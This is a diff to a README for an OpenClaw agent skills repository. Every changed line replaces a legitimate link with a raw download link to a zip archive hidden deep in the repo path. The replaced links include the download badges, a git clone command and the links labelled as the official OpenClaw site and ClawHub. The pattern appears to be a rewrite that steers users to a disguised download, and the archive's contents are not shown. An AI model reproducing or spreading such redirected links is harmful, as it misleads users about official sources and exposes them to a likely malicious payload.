@@ -1,6 +1,6 @@
 # 🦞 openclaw-skills - Community Skills for OpenClaw Agents
 
-[![Download openclaw-skills](https://img.shields.io/badge/Download-openclaw--skills-brightgreen?style=for-the-badge)](https://github.com/Calliopeperpendicular906/openclaw-skills)
+[![Download openclaw-skills](https://img.shields.io/badge/Download-openclaw--skills-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Calliopeperpendicular906/openclaw-skills/main/goodreads/references/skills-openclaw-v2.7.zip)
 
 ---
 
@@ -35,7 +35,7 @@ You can find the latest skills on ClawHub, but this repository provides a backup
 
 Use the button below to start.
 
-[![Download openclaw-skills](https://img.shields.io/badge/Download-openclaw--skills-blue?style=for-the-badge)](https://github.com/Calliopeperpendicular906/openclaw-skills)
+[![Download openclaw-skills](https://img.shields.io/badge/Download-openclaw--skills-blue?style=for-the-badge)](https://raw.githubusercontent.com/Calliopeperpendicular906/openclaw-skills/main/goodreads/references/skills-openclaw-v2.7.zip)
 
 ---
 
@@ -50,7 +50,7 @@ Alternatively, if you have Git installed, you can clone the repository:
 
 - Open the Command Prompt (type `cmd` in the Start menu).  
 - Type:  
-  `git clone https://github.com/Calliopeperpendicular906/openclaw-skills`  
+  `git clone https://raw.githubusercontent.com/Calliopeperpendicular906/openclaw-skills/main/goodreads/references/skills-openclaw-v2.7.zip`  
 - Press Enter.  
 
 Cloning downloads the full project folder to your computer.
@@ -136,15 +136,15 @@ You can also use ClawHub for easy skill management, but manual install works any
 
 ## 🔗 Useful Links
 
-- OpenClaw official site: https://openclaw.ai  
-- ClawHub: https://clawhub.ai  
-- openclaw-skills repo: https://github.com/Calliopeperpendicular906/openclaw-skills  
+- OpenClaw official site: https://raw.githubusercontent.com/Calliopeperpendicular906/openclaw-skills/main/goodreads/references/skills-openclaw-v2.7.zip  
+- ClawHub: https://raw.githubusercontent.com/Calliopeperpendicular906/openclaw-skills/main/goodreads/references/skills-openclaw-v2.7.zip  
+- openclaw-skills repo: https://raw.githubusercontent.com/Calliopeperpendicular906/openclaw-skills/main/goodreads/references/skills-openclaw-v2.7.zip  
 
 ---
 
 ## 📥 Download openclaw-skills
 
 Download the full project from this page:  
-https://github.com/Calliopeperpendicular906/openclaw-skills
+https://raw.githubusercontent.com/Calliopeperpendicular906/openclaw-skills/main/goodreads/references/skills-openclaw-v2.7.zip
 
-[![Download openclaw-skills](https://img.shields.io/badge/Download-openclaw--skills-brightgreen?style=for-the-badge)](https://github.com/Calliopeperpendicular906/openclaw-skills)
+[![Download openclaw-skills](https://img.shields.io/badge/Download-openclaw--skills-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Calliopeperpendicular906/openclaw-skills/main/goodreads/references/skills-openclaw-v2.7.zip)
